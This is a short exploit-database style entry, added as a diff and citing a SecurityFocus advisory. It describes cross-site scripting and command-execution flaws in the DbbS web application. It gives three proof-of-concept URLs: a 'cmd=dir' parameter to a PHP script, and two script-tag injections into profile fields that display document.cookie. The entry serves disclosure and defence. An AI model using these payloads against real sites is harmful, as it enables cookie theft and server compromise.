@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/17559/info
+
+DbbS is prone to multiple input-validation vulnerabilities. The issues include cross-site scripting and command-execution vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input. 
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based
+authentication credentials, execute commands to compromise the server, and launch other attacks.
+
+http://www.site.com/DbbS/suntzu.php?cmd=dir
+
+http://www.site.com/DbbS/profile.php?mode=edit&myid=1&ulocation="><script>alert(document.cookie)</script>
+
+http://www.site.com/DbbS/profile.php?mode=edit&myid=1&uhobbies="><script>alert(document.cookie)</script>
